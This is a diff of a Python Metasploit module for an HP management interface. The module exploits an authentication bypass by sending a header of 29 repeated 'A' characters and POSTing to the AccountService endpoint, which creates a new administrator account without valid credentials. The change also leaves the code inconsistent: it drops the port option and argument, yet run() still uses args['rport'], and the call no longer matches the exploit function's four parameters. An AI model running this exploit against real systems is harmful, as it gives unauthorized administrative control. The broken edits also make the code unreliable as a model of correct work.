@@ -7,7 +7,6 @@ import urllib3
 
 from metasploit import module
 
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 metadata = {
@@ -29,16 +28,14 @@ metadata = {
     'type': 'scanner.single',
     'options': {
         'rhost': {'type': 'address', 'description': 'The target address', 'required': True, 'default': None},
-        'rport': {'type': 'port', 'description': 'The target port', 'required': True, 'default': 80},
         'username': {'type': 'string', 'description': 'add user name', 'required': True, 'default': 'msf'},
-        'password': {'type': 'string', 'description': 'add user password', 'required': True, 'default': 'msf'},
+        'password': {'type': 'string', 'description': 'add user password', 'required': True, 'default': 'metasploit'},
     }}
 
 
 def exploit(ip, port, username, password):
     exploit_trigger = {'Connection': 'A' * 29}
-    accounts_url = 'https://{host}:{port}/rest/v1/AccountService/Accounts'
-
+    accounts_url = 'https://%s/rest/v1/AccountService/Accounts'
     Oem = {
         'Hp': {
             'LoginName': username,
@@ -57,7 +54,7 @@ def exploit(ip, port, username, password):
         'Password': password,
         'Oem': Oem
     }
-    url = accounts_url.format(host=ip, port=port)
+    url = accounts_url % ip
 
     try:
         response = requests.post(url, json=body, headers=exploit_trigger, verify=False)
@@ -72,7 +69,7 @@ def exploit(ip, port, username, password):
 
 def run(args):
     module.log('start exploit')
-    ret, data = exploit(args['rhost'], args['rport'], args['username'], args['password'])
+    ret, data = exploit(args['rhost'], args['username'], args['password'])
     if ret:
         module.log('Sucsessfully added user!')
         module.report_vuln(args['rhost'], 'Add New Administrator User', port=args['rport'], )
